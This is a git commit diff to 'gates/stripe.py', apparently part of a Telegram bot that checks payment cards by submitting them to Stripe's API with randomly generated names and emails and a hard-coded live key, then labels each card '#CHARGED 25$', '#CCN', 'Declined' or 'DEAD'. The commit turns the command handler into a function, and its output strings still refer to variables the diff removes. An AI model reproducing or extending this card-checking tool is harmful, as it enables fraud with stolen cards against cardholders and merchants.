ad53174e58ce563a73fdca78aa6d7447a5a52f9f
Altair000 <ains12403@gmail.com>
2024-08-15 20:35:46 -0400

    Update stripe.py

--- gates/stripe.py
+++ gates/stripe.py
@@ -2,10 +2,7 @@ import random
 from database.db import *
 from utils.bot_config import *
 
-@bot.message_handler(commands=['st'])
-def st(message):
-
-    # Random DATA
+def stripe(cc, mes, ano, cvv, message):
     letters = string.ascii_lowercase
     First = ''.join(random.choice(letters) for _ in range(6))
     Last = ''.join(random.choice(letters) for _ in range(6))
@@ -13,30 +10,11 @@ def st(message):
     Name = f'{First}+{Last}'
     Email = f'{First}.{Last}@gmail.com'
     session = requests.Session()
-    
+   
     message.answer_chat_action('typing')
     ID = message.from_user.id
     FIRST = message.from_user.first_name
-    if message.reply_to_message:
-        cc = message.reply_to_message.text
-    else:
-        cc = message.text[len('/st '):]
-
-    if len(cc) == 0:
-        return message.reply("<b>No Card to chk</b>")
-
-    x = re.findall(r'\d+', cc)
-    ccn = x[0]
-    mm = x[1]
-    yy = x[2]
-    cvv = x[3]
-    if mm.startswith('2'):
-        mm, yy = yy, mm
-    if len(mm) >= 3:
-        mm, yy, cvv = yy, cvv, mm
-    if len(ccn) < 15 or len(ccn) > 16:
-        return message.reply('<b>Failed to parse Card</b>\n'
-                                       '<b>Reason: Invalid Format!</b>')   
+    
     # get guid muid sid
     headers = {
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
@@ -55,9 +33,9 @@ def st(message):
         "sid": Sid,
         "key": "pk_live_iBIpeqzKOOx2Y8PFCRBfyMU000Q7xVG4Sn",
         "card[name]": Name,
-        "card[number]": ccn,
-        "card[exp_month]": mm,
-        "card[exp_year]": yy,
+        "card[number]": cc,
+        "card[exp_month]": mes,
+        "card[exp_year]": ano,
         "card[cvc]": cvv
     }
 
@@ -101,7 +79,6 @@ def st(message):
 ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ #CHARGED 25$
 <b>MSG</b>➟ {msg}
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>OWNER</b>: {is_owner(ID)}
 <b>BOT</b>: @{BOT_USERNAME}''')
@@ -111,7 +88,6 @@ def st(message):
 ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ #CCN
 <b>MSG</b>➟ {msg}
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>OWNER</b>: {is_owner(ID)}
 <b>BOT</b>: @{BOT_USERNAME}''')
@@ -121,7 +97,6 @@ def st(message):
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ #Declined
 <b>MSG</b>➟ {msg}
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>OWNER</b>: {is_owner(ID)}
 <b>BOT</b>: @{BOT_USERNAME}''')
@@ -130,7 +105,6 @@ def st(message):
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ DEAD
 <b>MSG</b>➟ {rx.text}
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>OWNER</b>: {is_owner(ID)}
 <b>BOT</b>: @{BOT_USERNAME}''')
